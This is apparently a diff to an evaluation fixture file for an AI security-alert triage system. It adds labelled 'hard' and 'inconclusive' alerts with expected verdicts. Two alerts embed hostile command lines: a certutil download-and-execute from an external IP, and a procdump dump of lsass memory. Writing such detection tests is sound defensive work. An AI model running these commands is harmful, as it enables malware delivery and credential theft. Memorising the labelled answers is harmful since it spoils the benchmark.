@@ -22,6 +22,19 @@
  *   - Tier 3 (behavior, technique with legitimate uses, signed vendor process) → false_positive (Gate D)
  *   - Tier 4 (generic/threshold rule, benign signed process) → false_positive (Gate D)
  *
+ * Two further groups probe where models separate, because every model scores 1.0 on the tier
+ * examples above:
+ *
+ *   - Hard boundary cases: malicious activity that looks benign (a signed Microsoft binary used
+ *     to download and run a payload, a low-severity rule on a high-precision technique) and one
+ *     benign case that looks alarming. The labels follow the same gates; the surface cues point
+ *     the other way.
+ *   - Inconclusive cases (Gate F): alerts whose critical observable fields are entirely absent.
+ *     The prompt reserves `inconclusive` for exactly this, so it is the only defensible label.
+ *     Their docs go through `buildEvidenceFreeDoc`, which also drops the few noise fields the
+ *     prompt renders as evidence (working directory, process hash, host OS, event dataset);
+ *     otherwise the "no evidence" alert would still show a process hash and a working directory.
+ *
  * Each alert carries a base rule uuid here, but the spec overrides it with a per-run unique uuid
  * before indexing (see the task in the spec). That is what guarantees the workflow's per-rule
  * enrichment queries (prevalence, close history, rule metadata) resolve to just the single seeded
@@ -239,6 +252,28 @@ export const buildDoc = ({
   ],
   ...observable,
 });
+
+/**
+ * Noise-envelope fields the alert-analysis prompt renders into the alert block. They are harmless
+ * on alerts that carry real evidence, but they would leak action/actor hints into alerts that are
+ * meant to have none, so `buildEvidenceFreeDoc` removes them.
+ */
+const RENDERED_NOISE_KEYS = [
+  'process.working_directory',
+  'process.hash.sha256',
+  'host.os.name',
+  'host.os.version',
+  'event.dataset',
+] as const;
+
+/** Like `buildDoc`, minus every noise field the prompt would render as evidence. */
+const buildEvidenceFreeDoc = (params: BuildAlertParams): Record<string, unknown> => {
+  const doc = buildDoc(params);
+  RENDERED_NOISE_KEYS.forEach((key) => {
+    delete doc[key];
+  });
+  return doc;
+};
 
 // ── Tier 1: automated malware / ransomware detection → true_positive (Gate A) ─────────────
 
@@ -535,6 +570,206 @@ const SCHEDULED_TASK: LabeledAlert = {
   }),
 };
 
+// ── Hard boundary cases: the surface cues point the opposite way to the label ──────────────
+
+const CERTUTIL_DOWNLOAD_EXEC: LabeledAlert = {
+  id: 'aa-eval-hard-certutil-download',
+  expected: 'true_positive',
+  description:
+    'Hard TP — low-severity generic rule (Tier 4) on a Microsoft-signed certutil.exe that ' +
+    'downloads from an external IP and runs the result from C:\\Users\\Public. Gate C: external ' +
+    'URL with download+execute is a concrete attack indicator, and Gate C is evaluated before ' +
+    'Gate D, so the valid signature and low severity do not make it routine.',
+  doc: buildDoc({
+    id: 'aa-eval-hard-certutil-download',
+    index: 8,
+    ruleName: 'Certificate Utility Network Activity',
+    ruleDescription: 'Detects certutil.exe making network connections or writing files.',
+    severity: 'low',
+    riskScore: 21,
+    tactic: { id: 'TA0011', name: 'Command and Control' },
+    technique: { id: 'T1105', name: 'Ingress Tool Transfer' },
+    observable: {
+      'event.kind': 'signal',
+      'event.category': ['process'],
+      'event.type': ['start'],
+      'event.outcome': 'success',
+      'host.name': 'ws-hr-03',
+      'user.name': 'lgarcia',
+      'process.name': 'certutil.exe',
+      'process.executable': 'C:\\Windows\\System32\\certutil.exe',
+      'process.command_line':
+        'certutil.exe -urlcache -split -f http://198.51.100.23/a.exe C:\\Users\\Public\\a.exe && C:\\Users\\Public\\a.exe',
+      'process.code_signature.exists': true,
+      'process.code_signature.trusted': true,
+      'process.code_signature.subject_name': 'Microsoft Windows',
+      'process.parent.name': 'cmd.exe',
+      'process.parent.executable': 'C:\\Windows\\System32\\cmd.exe',
+      'process.parent.code_signature.trusted': true,
+      'process.parent.code_signature.subject_name': 'Microsoft Windows',
+    },
+  }),
+};
+
+const LSASS_PROCDUMP_LOW_SEVERITY: LabeledAlert = {
+  id: 'aa-eval-hard-procdump-lsass',
+  expected: 'true_positive',
+  description:
+    'Hard TP — Tier 2 "Credential Access via LSASS Memory" scored low severity, with a ' +
+    'Microsoft-signed procdump.exe dumping lsass from a script in C:\\Users\\Public. Tier 2: ' +
+    'LSASS access has few legitimate explanations and Gate D is applied cautiously for Tier 2; ' +
+    'the dump written to Windows\\Temp by a user-writable parent is a concrete indicator ' +
+    '(Gate C), and absent a legitimate explanation Gate E also lands on true_positive.',
+  doc: buildDoc({
+    id: 'aa-eval-hard-procdump-lsass',
+    index: 9,
+    ruleName: 'Malicious Behavior Detection Alert: Credential Access via LSASS Memory',
+    ruleDescription:
+      'Elastic Defend behavioral engine detected access to LSASS process memory, consistent with credential dumping.',
+    severity: 'low',
+    riskScore: 21,
+    tactic: { id: 'TA0006', name: 'Credential Access' },
+    technique: { id: 'T1003', name: 'OS Credential Dumping' },
+    observable: {
+      'event.kind': 'signal',
+      'event.category': ['process'],
+      'event.type': ['start'],
+      'event.code': 'behavior',
+      'event.outcome': 'success',
+      'host.name': 'srv-app-12',
+      'user.name': 'svc-monitor',
+      'process.name': 'procdump64.exe',
+      'process.executable': 'C:\\Users\\Public\\procdump64.exe',
+      'process.command_line':
+        'procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\debug.dmp',
+      'process.code_signature.exists': true,
+      'process.code_signature.trusted': true,
+      'process.code_signature.subject_name': 'Microsoft Corporation',
+      'process.parent.name': 'collect.bat',
+      'process.parent.executable': 'C:\\Users\\Public\\collect.bat',
+    },
+  }),
+};
+
+const SIGNED_VENDOR_BYPASS_SCRIPT: LabeledAlert = {
+  id: 'aa-eval-hard-vendor-script',
+  expected: 'false_positive',
+  description:
+    'Hard FP — Tier 3 "Suspicious PowerShell Execution" at medium severity with ' +
+    '-ExecutionPolicy Bypass, but the parent is the Qualys agent running its own inventory ' +
+    'script from its Program Files directory, signed by Qualys. Gate D: actor, action, ' +
+    'arguments and signing authority fit a routine vendor workflow with no anomalous indicator; ' +
+    'no URL, encoded payload or user-writable path (so Gate C does not match).',
+  doc: buildDoc({
+    id: 'aa-eval-hard-vendor-script',
+    index: 10,
+    ruleName: 'Malicious Behavior Detection Alert: Suspicious PowerShell Execution',
+    ruleDescription:
+      'Elastic Defend behavioral engine detected PowerShell execution with an execution policy override, which can be used to run untrusted scripts.',
+    severity: 'medium',
+    riskScore: 47,
+    tactic: { id: 'TA0002', name: 'Execution' },
+    technique: { id: 'T1059.001', name: 'PowerShell' },
+    observable: {
+      'event.kind': 'signal',
+      'event.category': ['process'],
+      'event.type': ['start'],
+      'event.code': 'behavior',
+      'event.outcome': 'success',
+      'host.name': 'srv-db-05',
+      'user.name': 'SYSTEM',
+      'process.name': 'powershell.exe',
+      'process.executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+      'process.command_line':
+        'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\\Program Files\\Qualys\\QualysAgent\\Scripts\\inventory.ps1"',
+      'process.code_signature.exists': true,
+      'process.code_signature.trusted': true,
+      'process.code_signature.subject_name': 'Microsoft Windows',
+      'process.parent.name': 'QualysAgent.exe',
+      'process.parent.executable': 'C:\\Program Files\\Qualys\\QualysAgent\\QualysAgent.exe',
+      'process.parent.code_signature.trusted': true,
+      'process.parent.code_signature.subject_name': 'Qualys, Inc.',
+    },
+  }),
+};
+
+// ── Inconclusive: critical observable fields entirely absent (Gate F) ──────────────────────
+
+const INCONCLUSIVE_GENERIC_NO_FIELDS: LabeledAlert = {
+  id: 'aa-eval-inconclusive-no-evidence',
+  expected: 'inconclusive',
+  description:
+    'Gate F — generic Tier 4 rule alert with no process, no user, no file and no command line; ' +
+    'only the host is known. No action, no actor and no parameters: any classification is ' +
+    "indefensible, which is the prompt's one case for `inconclusive`. Gate D cannot match " +
+    '(nothing to fit to a routine pattern) and Gate C needs a concrete indicator.',
+  doc: buildEvidenceFreeDoc({
+    id: 'aa-eval-inconclusive-no-evidence',
+    index: 11,
+    ruleName: 'Anomalous Activity Detected',
+    ruleDescription: 'Generic anomaly rule that fires when host activity deviates from baseline.',
+    severity: 'medium',
+    riskScore: 47,
+    tactic: { id: 'TA0002', name: 'Execution' },
+    technique: { id: 'T1059', name: 'Command and Scripting Interpreter' },
+    observable: {
+      'event.kind': 'signal',
+      'host.name': 'ws-ops-14',
+    },
+  }),
+};
+
+const INCONCLUSIVE_CLOUD_NO_PRINCIPAL: LabeledAlert = {
+  id: 'aa-eval-inconclusive-cloud-no-principal',
+  expected: 'inconclusive',
+  description:
+    'Gate F — generic Tier 4 cloud rule alert carrying only a provider and region: no API ' +
+    'action, no principal, no request parameters, no source address. Same absence of action, ' +
+    'actor and parameters as the endpoint case, on a different data source, so the verdict ' +
+    'cannot depend on endpoint-shaped fields.',
+  doc: buildEvidenceFreeDoc({
+    id: 'aa-eval-inconclusive-cloud-no-principal',
+    index: 12,
+    ruleName: 'Unusual Cloud Account Activity',
+    ruleDescription: 'Generic rule that fires on unusual activity in a cloud account.',
+    severity: 'medium',
+    riskScore: 47,
+    tactic: { id: 'TA0001', name: 'Initial Access' },
+    technique: { id: 'T1078', name: 'Valid Accounts' },
+    observable: {
+      'event.kind': 'signal',
+      'cloud.provider': 'aws',
+      'cloud.region': 'eu-west-1',
+    },
+  }),
+};
+
+const INCONCLUSIVE_BEHAVIOR_NAME_ONLY: LabeledAlert = {
+  id: 'aa-eval-inconclusive-tier3-name-only',
+  expected: 'inconclusive',
+  description:
+    'Gate F — Tier 3 "Suspicious WMI Execution" (event.code=behavior) with no process, actor ' +
+    'or command line. Tier 3 is not Tier 2, so Gate E (true_positive by default) does not ' +
+    'apply, Gate C finds no indicator and Gate D has no evidence to fit; the technique name ' +
+    'alone is explicitly not sufficient. Gate F is the first gate that matches.',
+  doc: buildEvidenceFreeDoc({
+    id: 'aa-eval-inconclusive-tier3-name-only',
+    index: 13,
+    ruleName: 'Malicious Behavior Detection Alert: Suspicious WMI Execution',
+    ruleDescription:
+      'Elastic Defend behavioral engine detected WMI process execution, which can be used for remote execution.',
+    severity: 'medium',
+    riskScore: 47,
+    tactic: { id: 'TA0002', name: 'Execution' },
+    technique: { id: 'T1047', name: 'Windows Management Instrumentation' },
+    observable: {
+      'event.kind': 'signal',
+      'event.code': 'behavior',
+      'host.name': 'ws-it-08',
+    },
+  }),
+};
+
 export const ALERT_ANALYSIS_EVAL_ALERTS: LabeledAlert[] = [
   RANSOMWARE,
   MALICIOUS_FILE,
@@ -544,4 +779,10 @@ export const ALERT_ANALYSIS_EVAL_ALERTS: LabeledAlert[] = [
   STARTUP_PERSISTENCE,
   GENERIC_THRESHOLD,
   SCHEDULED_TASK,
+  CERTUTIL_DOWNLOAD_EXEC,
+  LSASS_PROCDUMP_LOW_SEVERITY,
+  SIGNED_VENDOR_BYPASS_SCRIPT,
+  INCONCLUSIVE_GENERIC_NO_FIELDS,
+  INCONCLUSIVE_CLOUD_NO_PRINCIPAL,
+  INCONCLUSIVE_BEHAVIOR_NAME_ONLY,
 ];
